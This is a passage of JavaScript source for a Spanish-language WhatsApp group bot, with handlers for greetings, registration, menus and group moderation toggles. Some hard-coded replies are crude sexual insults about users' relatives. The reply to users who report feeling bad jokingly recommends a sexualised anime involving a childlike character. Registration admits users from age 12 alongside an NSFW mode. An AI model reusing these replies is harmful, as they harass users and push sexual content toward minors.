\n¿Que tal mi rey ≧ω≦ :_`, `𝔹uenasss ${pushname} \n¿Que tal mi querido amig@? ≧ω≦ :_`, `𝔹uenasss ${pushname} \n¿Que tal como estas? ≧ω≦ :_`]
const cringe2 = offline3[Math.floor(Math.random() * (offline3.length))]
sendButMessage(from, `\n${cringe2}`, `Matt_M ✓`,[{buttonId: `${prefix}rpt51995386439yep`,buttonText: {displayText: `Bien 😁`,},type: 1,},{buttonId: `${prefix}rpt51995386439sow`,buttonText: {displayText: `Masomenos 😔`,},type: 1,},{buttonId: `${prefix}rpt51995386439sad`,buttonText: {displayText: `Mal 😢`,},type: 1,},])
break
case 'wenas':
case 'Wenas':
if (isBaneado) return
if (OnOffLine === false) return
const offline4 =[`𝕎enas ${pushname} \n¿Como estas mi destinguido amig@? ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Como estas mi Excelentísimo amig@? ≧ω≦ :_`,`𝕎enasa ${pushname} \n¿Como estas mi Apreciado amig@? ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Como estas mi Honorable amig@? ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Como estas mi Estimado amig@? ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Como estas wap@? ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Como estas mi king? ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Como estas mi rey ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Como estas mi querido amig@? ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Como estas? ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Que tal mi destinguido amig@? ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Que tal mi Excelentísimo amig@? ≧ω≦ :_`,`𝕎enas ${pushname} \n¿Que tal mi Apreciado amig@? ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Que tal mi Honorable amig@? ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Que tal mi Estimado amig@? ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Que tal wap@? ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Que tal mi king? ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Que tal mi rey ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Que tal mi querido amig@? ≧ω≦ :_`, `𝕎enas ${pushname} \n¿Que tal como estas? ≧ω≦ :_`]
const cringe3 = offline4[Math.floor(Math.random() * (offline4.length))]
sendButMessage(from, `\n${cringe3}`, `Matt_M ✓`,[{buttonId: `${prefix}rpt51995386439yep`,buttonText: {displayText: `Bien 😁`,},type: 1,},{buttonId: `${prefix}rpt51995386439sow`,buttonText: {displayText: `Masomenos 😔`,},type: 1,},{buttonId: `${prefix}rpt51995386439sad`,buttonText: {displayText: `Mal 😢`,},type: 1,},])
break
case '13':
case 'trece':
if (isBaneado) return
trolaso =[`_*ENTRE MAS ME LA MAMAS MAS ME CRECE*_ 🥵🤙??`, `_*TU MAMA POR LAS NOCHES C ME OFRECE*_ 😳👌`, `_*EL CULO TE ESCUECE*_ 😏`, `_*TU HERMANA ME MIRA EL PAQUETE Y SE ESTREMECE*_ 🥵🥵🥵`, `_*TU NOVIA DE TU PITO C ABORRECE*_ 😔🤙`]
bruhxd = trolaso[Math.floor(Math.random() * trolaso.length)]
reply(bruhxd)
teslagod.sendMessage(from, nkosmi, sticker, {quoted: estadouwur1})
break
}
switch (command) {
case 'rebote':
if (isBaneado) return
const pinpone =['Pong 🏓']
sendButMessage(from, `\n${pinpone}`, `Matt_M ✓`,
[{buttonId: `${prefix}rebote2`,buttonText: {displayText: `GOLPEAR 🏓`,}, type: 1,},])
break
case 'rebote2':
if (isBaneado) return
const pinpoon =['Pong 🏓', '🏓 Pong!!! 🏓', '🏓 Pong!!! 🏓', 'Pong 🏓', 'Pong 🏓', 'Pong 🏓', 'Pong 🏓', 'Responde con un golpe a 160 kmh*\nPong 🏓', 'Pong 🏓', 'Pong 🏓', 'Le da un golpe en la cabeza*\nPong 🏓', 'Pong 🏓', 'Pong 🏓', 'Pong 🏓', 'Pong 🏓', 'Pong 🏓', 'Pong 🏓', 'Pong 🏓', 'Le gana la partida*\n🏓 Pong!!! 🏓', 'Pong 🏓']
const pinpon3 = pinpoon[Math.floor(Math.random() * (pinpoon.length))]
reply(`${pinpon3}`)
break
case 'rpt51995386439yep':
if (isBaneado) return
if (OnOffLine === false) return
respuesta = `*Me alegro por ti UwU, Espero que siempre estes de lo mejor, ten en cuenta de la maravillosa persona que eres y no dejes que los malos momentos te hagan sentir mal crack.* \n*_${pushname}_*\n_Perdon si los usuarios del grupo_ ${groupName} _no te hablen o te ignoren, puede que esten haciendo algunas tareas esten ocupados o jalandosela_ ;) \n_Psdt: ~yo solo soy un bot programado no puedo comunicarme de forma normal lo ciento~`
reply(respuesta)
result = fs.readFileSync(`./multimedia/misstks/sticker/offlinechat2.webp`)
teslagod.sendMessage(from, result, sticker, {quoted: estadouwur1})
break
case 'rpt51995386439sow':
if (isBaneado) return
if (OnOffLine === false) return
respuesta = `*¿Mas o menos por que?, te recomiendo que hagas algo para distraerte y asi sentirte mejor ;3, no dejes que un mal dia te haga sentir de lo peor.*\n_*${pushname}*_\n_Ten en cuenta que los usuarios del grupo_ ${groupName} _puede que esten haciendo algunas tareas o esren ocupados_ \nPsdt: ~yo soy un bot programado no puedo comunicarme de forma normal lo siento mucho~`
reply(respuesta)
result = fs.readFileSync(`./multimedia/misstks/sticker/offlinechat.webp`)
teslagod.sendMessage(from, result, sticker, {quoted: estadouwur1})
break
case 'rpt51995386439sad':
if (isBaneado) return
if (OnOffLine === false) return
respuesta = `No estes asi ;_;, lo único que te podría aconsejar es: \n✔Leas un manga \n✔Hagas ejercicio \n✔Escuches musica \n✔Realiza una actividad que te guste \n❖ habla sobre cómo te sientes con un amigo o padres \n✔ ve un anime, te recomiendo ~boku no pico~ \n✯Si nada de esto funciona, _acude a un psicologo_ ;) \n${pushname}\n_Perdon si los usuarios del grupo_  ${groupName} _no te hablen o te ignoren, puede que esten haciendo algunas tareas esten ocupados o jalandosela_ ;) \nPsdt: ~yo soy un bot programado no puedo comunicarme de forma normal lo ciento mucho~`
reply(respuesta)
result = fs.readFileSync(`./multimedia/misstks/sticker/offlinechat1.webp`)
teslagod.sendMessage(from, result, sticker, {quoted: estadouwur1})
break
				//zona de comandos//
				
				
			
				
				
case "serbot":
case 'jadibot':
case 'rentbot':
case 'nuebot':
if (!SoyYo) return reply("*[ ! ] No puedes ser bot cuando ya eres un bot -.-*");
        jadibot(reply, teslagod, from);
        break;
      case "stoprentbot":
        if (!autonomo)
          return reply("Comando con error");
        stopjadibot(reply);
        break;
      case "listbot":
      case 'listserbot':
      case 'listnuebot':
        let tekss = "Multibots\n";
        for (let i of listjadibot) {
          tekss += `*Numero* : ${i.jid.split("@")[0]}
*Nombre* : ${i.name}
*Dispositivo* : ${i.phone.device_manufacturer}
*Modelo* : ${i.phone.device_model}\n\n`;
        }
        reply(tekss);
        break;
case 'modo1': //Activador de modos :v
if (isBaneado) return
if (!Matt_M && !autonomo && !isTeslaUser) return reply(idiomas.ownerB())
sendButMessage(from, idiomas.mode(), `Matt_M ✓`,[{buttonId: `${prefix}privado`,buttonText: {displayText: idiomas.mode2(),},type: 1,},{buttonId: `${prefix}publico`,buttonText: {displayText: idiomas.mode3(),},type: 1,},])
break
case 'modo2': //Activador de modos :v
if (isBaneado) return
if (!Matt_M && !autonomo && !isTeslaUser) return reply(idiomas.ownerB())
sendButMessage(from, idiomas.moden(), `Matt_M ✓`,[{buttonId: `${prefix}sinlinea`,buttonText: {displayText: idiomas.moden2(),},type: 1,},{buttonId: `${prefix}enlinea`,buttonText: {displayText: idiomas.moden3(),},type: 1,},])
break
case 'publico': //Modo libre para que todos puedan usar al bot ✓
if (isBaneado) return
if (!Matt_M && !autonomo && !isTeslaUser) return reply(idiomas.ownerB())
if (NK_Tesla === false) return
NK_Tesla = false
reply(idiomas.mode4())
break
case 'privado': //Solo podra usar el creador del bot!!!
if (isBaneado) return
if (!Matt_M && !autonomo && !isTeslaUser) return reply(idiomas.ownerB())
if (NK_Tesla === true) return
NK_Tesla = true
reply(idiomas.mode5())
break
case 'enlinea': //comandos que requieren internet libres
if (isBaneado) return
if (!Matt_M && !autonomo && !isTeslaUser) return reply(idiomas.ownerB())
if (OnOffLine === false) return
OnOffLine = false
reply(idiomas.moden4())
break
case 'sinlinea': //comandos que requieren internet desactivados
if (isBaneado) return
if (!Matt_M && !autonomo && !isTeslaUser) return reply(idiomas.ownerB())
if (OnOffLine === true) return
OnOffLine = true
reply(idiomas.moden5())
break
case 'estadobot': //ver el estado en el que se encuentra el bot
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
reply(idiomas.mode6() + `\n\n${NK_Tesla ? "*MODO-PRIVADO [ ! ]*" : "*MODO-PUBLICO [✓]*"}\n\n${OnOffLine ? "*MODO-OFFLINE [ ! ]*" : "*MODO-ONLINE [ ! ]*"}`)
break
case 'prefijoedit': //Comando para cambiar el prefijo
if (isBaneado) return
if (args.length < 1) return reply(idiomas.predit())
if (!Matt_M && !autonomo && !isTeslaUser) return reply(idiomas.ownerB())
prefix = args[0]
ajustes.prefix = prefix
fs.writeFileSync('./basededatos/ajustes.json', JSON.stringify(ajustes, null, '\t'))
reply(idiomas.predit2(prefix))
break
case 'apoyo':
if (isBaneado) return
teslagod.updatePresence(from, Presence.recording)
teslagod.sendMessage(from, fs.readFileSync('./multimedia/imagenes/logo.png'), image, {quoted: estadouwur1, contextInfo:{externalAdReply: {title: `${pushname} 7w7r`, body: 'UwU', sourceUrl: 'https://youtube.com/channel/UC_Pp8pT9vbT15k5_-i6oseA', thumbnail: fs.readFileSync('./multimedia/imagenes/milogohd.jpg')}}, caption: idiomas.apoyouwu(), thumbnail: fs.readFileSync('./multimedia/imagenes/milogo.jpg'), sendEphemeral: true})
await limitAdd(sender)
addLevelingXp(sender, 450)
addLevelingLevel(sender, 1)
break

case 'gruposwa':
case 'wagrupos':
TeslApi = await fetchJson(`https://pastebin.com/raw/sCFzTy2K`)
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (OnOffLine === true) return reply(idiomas.sinnet())
if (!isGroup) return reply(idiomas.group())
if (!isBotGroupAdmins && !autonomo) return reply(idiomas.Badmin())
teslagod.sendMessage(from, TeslApi.gplinks, text, { quoted: estarder, contextInfo:{externalAdReply: {title: `${pushname} Quieres agregar tu grupo?`, body: 'Toca aqui ;3', sourceUrl: 'https://api.whatsapp.com/send?phone=51995386439&text=Wenasss%0ADeseo%20agregar%20mi%20grupo%20de%20WhatsApp%0ATema%20de%20mi%20grupo%3A%20%0ALink%3A%20', thumbnail: fs.readFileSync('./multimedia/imagenes/usergod.jpeg')}}, sendEphemeral: true })
break
case 'himnotaku':
case 'himnootaku':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isAnime) return reply(idiomas.animes())
reply(idiomas.waittt())
TeslApi = fs.readFileSync(`./multimedia/sonidos/audiouwu/flp.m4a`)
teslagod.sendMessage(from, TeslApi, audio, { mimetype: 'audio/mp4',  quoted: audiowor, ptt: true })
break
case 'perfil':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
uptime = process.uptime()
let grupos = await teslagod.chats.all()
        let i4 = []
        let personal = []
        for (let mem of grupos){
          i4.push(mem.jid)
        }
        for (let id of i4){
          if (id && id.includes('g.us')){
            personal.push(id)
          }
        }
const execc = `${kyun(uptime)}`
const timestamp = speed()
const latensi = speed() - timestamp
const conectin = `${latensi.toFixed(4)} MS`
const apodox = `${teslagod.user.name}`
const servery = `${teslagod.browserDescription[0]}`
const browserr = `${teslagod.browserDescription[1]}`
const procesor = `${process.uptime()}`
const celular = `${device_manufacturer}`
const osversi = `${os_version}`
const modelo = `${device_model}`
const memory = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / Restante ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
const infomcc = `${mcc}`
const infomnc = `${mnc}`
const wasapv = `${teslagod.user.phone.wa_version}`
const hitshoy = `${hit_today.length}`
const mischat = `${grupos.length - personal.length}`
const misgp = `${personal.length}`
const mispriv = `${grupos.length}`
const osarch = `${os.platform()}`
const myhost = `${os.hostname()}`
teslagod.updatePresence(from, Presence.composing) 
teslagod.sendMessage(from, idiomas.infobot(execc, apodox, servery, browserr, conectin, procesor, celular, osversi, modelo, memory, infomcc, infomnc, wasapv, hitshoy, misgp, mispriv, mischat, osarch, myhost), text, { quoted: estarder})
break
case 'rg':
if (isBaneado) return reply(idiomas.benned())
if (!isGroup) return reply(idiomas.group())
if (args.length < 1) return reply(idiomas.reg(prefix))
if (isRegistrado) return reply(idiomas.reg2())
if (!UwU.includes('|')) return  reply(idiomas.reg3(prefix))
var reg = body.slice(4)
var jeneng = reg.split("|")[0];
var umure = reg.split("|")[1];
const nombre = UwU.substring(0, UwU.indexOf('|') - 0)
const edad = UwU.substring(UwU.lastIndexOf('|') + 1)
const rgNombre = `${jeneng}`
const rgEdad = `${umure}`
const serialUser = createSerial(20)
if(isNaN(edad)) return await reply(idiomas.reg4())
if (nombre.length >= 10) return reply(idiomas.reg5())
if (edad > 35) return reply(idiomas.reg6())
if (edad < 12) return reply(idiomas.reg7())
if (isGroup) {
  addRegisteredUser(sender, jeneng, umure, rgNombre, rgEdad, time, serialUser)
  hasil = idiomas.reg8(sender, pushname, rgNombre, rgEdad, time, serialUser)
reeply(hasil)
  console.log(color('[REGISTRADO]'), color(time, 'yellow'), 'Nombre:', color(rgNombre, 'cyan'), 'Edad:', color(rgEdad, 'cyan'), 'Serial:', color(serialUser, 'cyan'), 'en el grupo', color(sender || groupName))
} else {
  addRegisteredUser(sender, rgNombre, rgEdad, time, serialUser)
  hasil = idiomas.reg8(sender, pushname, rgNombre, rgEdad, time, serialUser)
reeply(hasil)
  console.log(color('[REGISTRADO]'), color(time, 'yellow'), 'Nombre:', color(rgNombre, 'cyan'), 'Edad:', color(rgEdad, 'cyan'), 'Serial:', color(serialUser, 'cyan'))
}
tm = idiomas.reg9(prefix)
setTimeout( () => {
reply(tm)
}, 800)
break
case 'panelcomandos': //panel de comandos
case 'panelmenu':
case 'comandos':
if (isBaneado) return reply(idiomas.benned())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
sendButLocation(from, `*╔═「 ${namebotuwu} ᴮʸ⁻ᴺᴷ」═*\n*║*\n*╠ Version : 4.0.0*\n*║*\n*╠ ESTADO DEL BOT :*\n*║ACTIVO ✓*\n*║${NK_Tesla ? "MODO-PRIVADO [ ! ]" : "MODO-PUBLICO [✓]"}*\n*║${OnOffLine ? "MODO-OFFLINE [ ! ]" : "MODO-ONLINE [ ! ]"}*\n*║*\n`, `Matt_M`, {jpegThumbnail: await fs.readFileSync('./multimedia/imagenes/logo.png')}, [{buttonId:`${prefix}comenzar`,buttonText:{displayText:idiomas.apoyouwu2()},type:1},{buttonId:`${prefix}tutorial`,buttonText:{displayText:idiomas.tutobot()},type:1}], {contextInfo: { mentionedJid: [sender, "51995386439@s.whatsapp.net"]}})
break
case 'menu':
case 'help':
if (isBaneado) return reply(idiomas.benned())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
reply(`_*Cargando el panel de comandos espere...*_ \nˢᶦ ⁿᵒ ᵗᵉ ᵃᵖᵃʳᵉᶜᵉ ᵐᶦ ᵖᵃⁿᵉˡ ᵈᵉ ᶜᵒᵐᵃⁿᵈᵒˢ ʳᵉᶦⁿᵗᵉⁿᵗᵃ ⁿᵘᵉᵛᵃᵐᵉⁿᵗᵉ ᵈᵉⁿᵗʳᵒ ᵈᵉ ᵘⁿ ˡᵃᵖˢᵒ ᵈᵉ ⁷ ˢᵉᵍᵘⁿᵈᵒˢ ᵖᵒʳ ᶠᵃᵛᵒʳ `)
me = teslagod.user
					uptime = process.uptime()
					myMonths = ["Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre"];
                myDays = ['Domingo: dia de dencanso UwU','Lunes: comienzo de la semana','Martes: segundo dia de la semana','Miercoles: tercer dia de la semana','Jueves: FELIZ JUEVES!!!','Viernes: fin de semana','Sabado: dia libre'];
                var tgl = new Date();
                var day = tgl.getDate()
                  bulan = tgl.getMonth()
                var thisDay = tgl.getDay(),
                thisDay = myDays[thisDay];
                var yy = tgl.getYear()
                var year = (yy < 1000) ? yy + 1900 : yy;
                    putagg = fs.readFileSync(`./multimedia/imagenes/milogo.jpg`)
    wew = fs.readFileSync(`./multimedia/imagenes/logouwur.jpg`)
    	var mensu = `*✬▁▄▆ ${namebotuwu} ᴮʸ⁻ᴺᴷ ▆▄▁✬*
╔✪〘  *Informacion*  〙✪╗
║BOT : (Activo) 
║Actividad : ${kyun(uptime)}
║──────⊹⊱✫⊰⊹──────
║➩ ❍ *Apodo en WhatsApp : ${me.name}*
║➩ ❍ *Version del bot : 5.0.0*
║➩ ❍ *Prefijo : 「  ${prefix}  」*
║➩ ❍ *Creador : ${nombrecontact}*
║➩ ❍ *Nombre del bot : ${namebotuwu}*
║➩ ❍ *Cliente : ${pushname}️*
║➩ ❍ *Rol del Cliente : ${role}*
╚═══════════════╝
》 🜚 *FECHA Y HORA* : 
${thisDay} \n${day} - ${myMonths[bulan]} - ${year} ${time}
┏───── ⊹ ⊱♡⊰ ⊹ ─────┓
❌ᴺᵒ ˢᵃᵗᵘʳᵉⁿ ᴬˡ ᴮᵒᵗ ᴾᵒʳᶠᵃ❌≫-≪
┗───── ⊹ ⊱♡⊰ ⊹ ─────┛\n》▪︎⚡𝑺𝒆𝒙𝒚 𝑬𝒍 𝒒𝒖𝒆 𝒍𝒐 𝒍𝒆𝒂⚡▪︎《`
    const timestampp = speed();
	const latensii = speed() - timestampp
	run = process.uptime() 
    teks = `${kyun(run)}`
    try {
pic = await teslagod.getProfilePicture(sender)
pic2 = 'https://i.imgur.com/daGiF1x.jpg'
} catch {
pic = 'https://i.imgur.com/h3ndbzj.jpg'
pic2 = 'https://i.imgur.com/daGiF1x.jpg'
}
gambar = await getBuffer(pic)
gambar2 = await getBuffer(pic2)
mhan = await teslagod.prepareMessage(from, gambar2, image, {thumbnail: gambar})
gbutsan = [
    {buttonId: `${prefix}apoyo`, buttonText: {displayText: 'Apoyo'}, type: 1},
  {buttonId: `${prefix}perfil`, buttonText: {displayText: 'Info del bot'}, type: 1},
    {buttonId: `${prefix}mascmds`, buttonText: {displayText: 'Otros comandos'}, type: 1},
  {buttonId: `${prefix}ruleta`, buttonText: {displayText: 'Solo el mas suertudo sobrevive'}, type: 1}
]
 gbuttonan = {
imageMessage: mhan.message.imageMessage,
    contentText: mensu,
    footerText: `By Matt M`,
    buttons: gbutsan,
    headerType: 4
}
await teslagod.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./multimedia/imagenes/milogo.jpg'),
        caption: mensu,
        "contextInfo": {
            mentionedJid: [sender]},
            quoted: estarder})
           	break
case 'mascmds':
if (isBaneado) return reply(idiomas.benned())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
                let rrrandom = teslagod.prepareMessageFromContent(from, {
                    "listMessage":  {
                        "title": "Mas_Comandos ✓",
                        "description": "[ ! ] Seleccione solo una opción :3",
                        "buttonText": "Click Aqui ⚡",
                        "listType": "SINGLE_SELECT",
                        "sections": [
                            {
                                "rows": [
                                    {
                                        "title": `La-Biblia-🥵`,
                                        "rowId": `${prefix}labiblia`
                                    },
                                    {
                                        "title": `Crear-Logos- 🎨`,
                                        "rowId": `${prefix}crealogos`
                                    },
                                    {
                                        "title": `Anime-Imagenes-🀄`,
                                        "rowId": `${prefix}animages`
                                    },
                                    {
                                        "title": `Random-Menu-♻️`,
                                        "rowId": `${prefix}randmenu`
                                    }
                                ]
                            }
                        ]
                    }
                }, {})
            teslagod.relayWAMessage(rrrandom, {waitForAck: true})
            break
case 'comenzar':
if (isBaneado) return reply(idiomas.benned())
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
        const nkbot1 =[`Hola`, `Wenas`, `Que tal`, `Hi`, `Hello`, `Olá`, `Namaste`, `Hey!`, `Aloha`, `Konnichi wa`, `Mi king`, `Que hay`, `Como estas`, `Oi`, `ª`]
		const nikola = nkbot1[Math.floor(Math.random() * (nkbot1.length))]
midios = `${nikola}`
       var txtt =`${midios} ${pushname}\nPor favor seleccione una opción para comenzar :3\n    ‏  ‌    ‏  ‌\nhttps://github.com/NeKosmic/NK-BOT`
               putagg1 = fs.readFileSync(`./multimedia/imagenes/milogo.jpg`)
    wew2 = fs.readFileSync(`./multimedia/imagenes/logouwur.jpg`)
	run = process.uptime() 
    teks = `${kyun(run)}`
mhan = await teslagod.prepareMessage(from, putagg1, image, {thumbnail: wew2})
gbutsan = [{buttonId:`${prefix}panelmenu`, 
               buttonText:{displayText: 'Menu 1'},type:1},
               {buttonId:`${prefix}menu`,buttonText:{displayText:'Menu 2'},type:1},
               {buttonId:`${prefix}creador`,buttonText:{displayText:'Creador'},type:1},
{buttonId:`uwu`, 
               buttonText:{displayText: 'UwU'},type:1}]
 gbuttonan = {
imageMessage: mhan.message.imageMessage,
    contentText: txtt,
    footerText: `Actividad del bot : ${teks}\nBy Matt M`,
    buttons: gbutsan,
    headerType: 4
}
await teslagod.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./multimedia/imagenes/milogo.jpg'),
        caption: txtt,
        "contextInfo": {
            mentionedJid: [sender]},
            quoted: estarder})
           	break
case 'modofull':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (args[0] == "activado") {
if (isDiversion) return reply(idiomas.yaesta() + ` ${groupMetadata.subject}`)
_diversion.push(from)
fs.writeFileSync("./basededatos/json/modofull.json",JSON.stringify(_diversion))
reply(idiomas.fullmo2() + ` ${groupMetadata.subject}`)
} else if (args[0] == "desactivado") {
_diversion.splice(from, 1)
fs.writeFileSync("./basededatos/json/modofull.json",JSON.stringify(_diversion))
reply(idiomas.fullmo3() + ` ${groupMetadata.subject}`)
} else if (!UwU) {
sendButMessage(from, idiomas.fullmo4(), `Matt_M ✓`, [{buttonId: `${prefix}modofull activado`,buttonText: {displayText: idiomas.activar() + `☰ ] >`,},type: 1,},{buttonId: `${prefix}modofull desactivado`,buttonText: {displayText: idiomas.desactivar() + `☰ ] >`,},type: 1,},])
}
break
case 'animeuwu':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (args[0] == "chi") {
if (isAnime) return reply(idiomas.yaesta() + ` ${groupMetadata.subject} UwU`)
_anime.push(from)
fs.writeFileSync("./basededatos/json/anime.json",JSON.stringify(_anime))
reply(idiomas.animes2() + ` ${groupMetadata.subject} UwU`)
} else if (args[0] == "nu") {
_anime.splice(from, 1)
fs.writeFileSync("./basededatos/json/anime.json",JSON.stringify(_anime))
reply(idiomas.animes3() + `${groupMetadata.subject} UnU`)
} else if (!UwU) {
sendButMessage(from, idiomas.animes4(), `Matt_M ✓`, [{buttonId: `${prefix}animeuwu chi`,buttonText: {displayText: idiomas.activar() + `:3 ] >`,},type: 1,},{buttonId: `${prefix}animeuwu nu`,buttonText: {displayText: idiomas.desactivar() + `:'3 ] >`,},type: 1,},])
}
break
case 'wlc': //bienvenida automática
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isBotGroupAdmins && !autonomo) return reply(idiomas.Badmin())
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (args[0] == "on") {
if (isWelkom) return reply(idiomas.yaesta())
welkom.push(from);
fs.writeFileSync("./basededatos/json/welkom.json",JSON.stringify(welkom))
reply(idiomas.wlcon())
} else if (args[0] == "off") {
welkom.splice(from, 1);
fs.writeFileSync("./basededatos/json/welkom.json",JSON.stringify(welkom))
reply(idiomas.wlcoff())
} else if (!UwU) {
sendButMessage(from, idiomas.wlcon2(), `Matt_M ✓`,[{buttonId: `${prefix}wlc on`,buttonText: {displayText: idiomas.activar() + `🛬] >`,},type: 1,},{buttonId: `${prefix}wlc off`,buttonText: {displayText: idiomas.desactivar() + `🛫] >`,},type: 1,},]);
}
break
case 'antilink':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (args[0] == "si") {
if (isAntiLink) return reply(idiomas.yaesta() + ` *${groupMetadata.subject}*`)
_antilink.push(from)
fs.writeFileSync("./basededatos/json/antilink.json",JSON.stringify(_antilink))
reply(idiomas.dlinkon() + ` *${groupMetadata.subject}*`)
} else if (args[0] == "no") {
_antilink.splice(from, 1);
fs.writeFileSync("./basededatos/json/antilink.json",JSON.stringify(_antilink))
reply(idiomas.dlinkoff() + ` *${groupMetadata.subject}*`)
} else if (!UwU) {
sendButMessage(from, idiomas.dlink(), `Matt_M ✓`, [{buttonId: `${prefix}antilink si`,buttonText: {displayText: idiomas.activar() + `⛓️] >`,},type: 1,},{buttonId: `${prefix}antilink no`,buttonText: {displayText: idiomas.desactivar() + `🔗] >`,},type: 1,},])
}
break
case 'antilink2':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (args[0] == "si") {
if (isAntiLinkuwu) return reply(idiomas.yaesta() + ` *${groupMetadata.subject}*`)
_antilinkuwu.push(from)
fs.writeFileSync("./basededatos/json/antilink2.json",JSON.stringify(_antilinkuwu))
reply(`Se activo el modo Anti-Link-Multiple en el grupo *${groupMetadata.subject}*`)
} else if (args[0] == "no") {
_antilinkuwu.splice(from, 1)
fs.writeFileSync("./basededatos/json/antilink2.json",JSON.stringify(_antilinkuwu))
reply(`Se desactivo el modo Anti-Link-Multiple en el grupo *${groupMetadata.subject}*`)
} else if (!UwU) {
sendButMessage(from, `_*[MODO ANTILINK MULTIPLE]*_`, `Matt_M ✓`, [{buttonId: `${prefix}antilink2 si`,buttonText: {displayText: `Activar`,},type: 1,},{buttonId: `${prefix}antilink2 no`,buttonText: {displayText: `Desactivar`,},type: 1,},])
}
break
case 'banchat':
case 'chatban':
if (isBaneado) return
if (!Matt_M && !autonomo && !isTeslaUser) return reply(idiomas.ownerB())
if (!isGroup) return reply(idiomas.group())
if (!isBotGroupAdmins && !autonomo) return reply(idiomas.Badmin())
if (args[0] == "sialv") {
if (isBanChat) return reply(idiomas.yaesta())
_chatban.push(from)
fs.writeFileSync("./basededatos/json/ban.json",JSON.stringify(_chatban))
reply(idiomas.banichat())
} else if (args[0] == "noalv") {
_chatban.splice(from, 1)
fs.writeFileSync("./basededatos/json/ban.json",JSON.stringify(_chatban))
reply(idiomas.banichat2())
} else if (!UwU) {
sendButMessage(from, idiomas.banichat3(), `Matt_M ✓`, [{buttonId: `${prefix}banchat sialv`,buttonText: {displayText: idiomas.activar() + `⚔️] >`,},type: 1,},{buttonId: `${prefix}banchat noalv`,buttonText: {displayText: idiomas.desactivar() + `🛡️] >`,},type: 1,},])
}
break
case 'hmodo':
if (isBaneado) return
if (!Matt_M && !autonomo && !isTeslaUser) return reply(idiomas.ownerB())
if (!isGroup) return reply(idiomas.group())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (args[0] == "confirmo") {
if (isNsfw) return reply(idiomas.yaesta() + ` ${groupMetadata.subject} 7w7r`)
_nsfw.push(from)
fs.writeFileSync("./basededatos/json/nsfw.json",JSON.stringify(_nsfw))
reply(idiomas.nsfw2() + ` ${groupMetadata.subject} 7w7r`)
} else if (args[0] == "desconfirmo") {
_nsfw.splice(from, 1)
fs.writeFileSync("./basededatos/json/nsfw.json",JSON.stringify(_nsfw))
reply(idiomas.nsfw3() + ` ${groupMetadata.subject}`)
} else if (!UwU) {
sendButMessage(from, idiomas.nsfw4(), `Matt_M ✓`, [{buttonId: `${prefix}hmodo confirmo`,buttonText: {displayText: idiomas.activar() + `🥵] >`,},type: 1,},{buttonId: `${prefix}hmodo desconfirmo`,buttonText: {displayText: idiomas.desactivar() + `😳] >`,},type: 1,},])
}
break
case 'antifakes':                
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isBotGroupAdmins) return reply(idiomas.Badmin())
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if (args.length < 1) return reply(`Digite ${prefix + command} 1 para activar, 0 para desactivar`)
if (args[0] === '1') {
if (isAntifakes) return reply(idiomas.yaesta())          
_antifakes.push(from)                          
fs.writeFileSync('./basededatos/json/antifakes.json', JSON.stringify(_antifakes))      
reply(`*[ ✓ ] Activado*`)
} else if (args[0] === '0') {             
var ini = _antifakes.indexOf(from)
_antifakes.splice(ini, 1)           
fs.writeFileSync('./basededatos/json/antifakes.json', JSON.stringify(_antifakes))       
reply(`*[ ! ] Desactivado*`)              
} else {                                         
reply('1 para activar, 0 para desactivar')           
}
